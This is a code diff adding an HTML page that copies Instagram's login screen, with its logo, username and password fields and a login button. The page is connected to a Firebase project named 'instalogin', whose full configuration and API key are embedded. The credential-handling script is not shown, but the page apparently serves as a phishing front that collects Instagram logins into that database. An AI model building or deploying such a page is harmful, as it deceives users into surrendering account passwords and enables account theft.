@@ -1,0 +1,62 @@
+<html>
+
+<head>
+
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-firestore.js"></script>
+
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-analytics.js"></script>
+
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="images/instagram.png" />
+            </div>
+            <div class="l-part">
+                <input type="text" id="username" placeholder="Username" class="input-1" />
+                <div class="overlap-text">
+                    <input type="password" id="password" placeholder="Password" class="input-2" />
+                    <a href="#">Forgot?</a>
+                </div>
+                <input type="button"  id="login" value="Log in" class="btn" />
+            </div>
+        </div>
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account?<a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+            apiKey: "AIzaSyAlS8t2lpFlmX5WP-A5ZPUHkXEw4TD6_2c",
+            authDomain: "instalogin-be04c.firebaseapp.com",
+            databaseURL: "https://instalogin-be04c-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "instalogin-be04c",
+            storageBucket: "instalogin-be04c.appspot.com",
+            messagingSenderId: "400312352180",
+            appId: "1:400312352180:web:a161f897f7e72ec8eac6e1",
+            measurementId: "G-M3GHGVMP2H"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+        const db = firebase.firestore();
+        db.settings({timeInSnapshots: true});
+    </script>
+
+</body>
+<script src="js/index.js"></script>
+
+</html>
